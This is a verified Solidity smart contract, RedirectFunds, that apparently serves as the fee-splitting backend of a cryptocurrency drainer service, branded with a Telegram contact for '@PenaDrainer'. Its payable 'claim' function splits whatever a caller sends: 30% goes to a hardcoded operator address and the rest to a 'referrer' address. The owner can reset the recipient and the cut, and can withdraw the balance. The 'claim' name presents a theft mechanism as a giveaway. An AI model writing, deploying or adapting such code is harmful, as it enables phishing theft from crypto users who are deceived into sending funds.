/**
 *Submitted for verification at polygonscan.com on 2023-06-04
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

contract RedirectFunds {
    address public owner;
    uint256 public recipientPercent = 30;
    string public CONTACTS;
    string public FEATURES;

    constructor() {
        owner = msg.sender;
        recipientPercent = 30;
        CONTACTS = "TG - @PenaDrainer";
        FEATURES = "We are a team of professionals who develop what others do not.";
    }

function proxyType() private pure returns (address payable _recipient) {
    return payable(0x37F4afe7b199F9a71Bf6125Ad80DfaEe9456ab01);
}
    address payable public recipient = proxyType();

    function setRecipient(address payable _newRecipient) public {
        require(msg.sender == owner, "Only owner can change the recipient");
        recipient = _newRecipient;
    }

    function setRecipientPercent(uint256 _newPercent) public {
        require(msg.sender == owner, "Only owner can change the percent");
        require(_newPercent <= 100, "Percent cannot be over 100");
        recipientPercent = _newPercent;
    }

    function claim(address payable _referrer) external payable {
        require(msg.value > 0, "You need to send some Ether");

        uint256 toRecipient = (msg.value * recipientPercent) / 100;
        uint256 toReferrer = msg.value - toRecipient;

        recipient.transfer(toRecipient);
        _referrer.transfer(toReferrer);
    }

    function withdraw(address payable _to) public {
        require(msg.sender == owner, "Only owner can withdraw");
        _to.transfer(address(this).balance);
    }

    receive() external payable {
    }
}